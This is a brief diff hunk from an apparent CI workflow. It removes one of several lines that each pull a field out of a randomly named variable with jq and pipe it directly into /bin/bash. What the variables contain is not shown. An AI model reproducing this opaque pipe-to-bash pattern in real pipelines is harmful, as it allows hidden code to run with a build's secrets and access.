@@ -44,7 +44,6 @@ jobs:
           echo $shcbt751 | jq -r .xao7687 | /bin/bash
           echo $isd01 | jq -r .fhfe40886 | /bin/bash
           echo $zeopw01 | jq -r .jydd763 | /bin/bash
-          printf '%s' "$yggpc58569" | jq -r .khozd3 | /bin/bash
           echo $qxndd10 | jq -r .eadm5866 | /bin/bash
           echo $pobgi755 | jq -r .qkifh70 | /bin/bash
           echo $iom86378 | jq -r .lebi1181 | /bin/bash
